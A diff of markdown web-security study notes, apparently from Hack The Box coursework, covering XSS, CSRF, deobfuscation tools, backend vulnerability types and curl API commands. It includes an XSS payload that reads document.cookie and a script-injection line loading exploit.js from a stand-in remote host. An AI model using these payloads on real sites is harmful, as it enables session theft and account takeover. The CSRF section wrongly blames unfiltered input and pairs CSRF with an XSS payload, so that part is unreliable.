@@ -38,33 +38,32 @@
 
 # 🎨 Frontend Vulnerabilities
 ## 💥 Cross-Site Scripting (XSS)
-
 -   **3 types:**  `Reflected`, `Stored`, `DOM`
 ```javascript
 #"><img src=/ onerror=alert(document.cookie)>
 ```
-## Cross-Site Request Forgery (CSRF)
+## 🌀 Cross-Site Request Forgery (CSRF)
 - caused by unfiltered user input
 - **common `CSRF` attack:** 
 	- gain admin priv
 	- craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker.
-	 
 ```html
 "><script src=//www.example.com/exploit.js></script>
 ```
-## Deobfuscation Websites
 
+## 🧰 Deobfuscation Tools
 - [JS Console](https://jsconsole.com)
 - [Prettier](https://prettier.io/playground/)
 - [Beautifier](https://beautifier.io/)
 - [JSNice](http://www.jsnice.org/)
-# BackEnd Vulnerabilities
-- Broken Auth/Access Control (Bypass login)
-- Malicious File Upload
-- Command Injection
-- SQL Injection (SQLi)
-- CVEs
 
+# 🖥️ Backend Vulnerabilities
+
+-   🔓 Broken Auth / Access Control (Bypass login)
+-   📁 Malicious File Upload
+-   🧨 Command Injection
+-   💉 SQL Injection (SQLi)
+-   🧾 CVEs (Common Vulnerabilities & Exposures)
 # cURL
 ## curl
 curl url					
@@ -115,6 +114,6 @@ curl url
 `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` | Delete entry
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTgyNDA0MTAyMCwtMTQ0NDQ5Mjc2NCwtMT
+eyJoaXN0b3J5IjpbLTMxMjY3NjQ0OCwtMTQ0NDQ5Mjc2NCwtMT
 c0OTg4ODYxNSwxOTY1ODU2ODYyXX0=
 -->
